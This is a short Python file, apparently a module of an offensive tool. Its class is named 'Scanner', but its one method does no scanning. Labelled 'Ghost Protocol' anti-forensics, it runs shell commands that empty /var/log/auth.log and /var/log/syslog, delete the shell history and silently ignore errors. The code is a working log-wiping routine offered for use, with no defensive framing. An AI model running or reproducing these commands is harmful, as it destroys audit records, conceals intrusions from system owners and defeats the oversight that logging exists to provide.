import asyncio
import os

class Scanner:
    def __init__(self, config):
        self.config = config

    async def run(self, target, options):
        # Evasion & Log Cleaning
        print("[*] Активация Ghost Protocol: Очистка журналов...")
        cmds = [
            "truncate -s 0 /var/log/auth.log",
            "truncate -s 0 /var/log/syslog",
            "rm -f ~/.bash_history && history -c"
        ]
        for cmd in cmds:
            try:
                p = await asyncio.create_subprocess_shell(cmd)
                await p.wait()
            except: pass
        print("[+] Anti-Forensics завершен.")
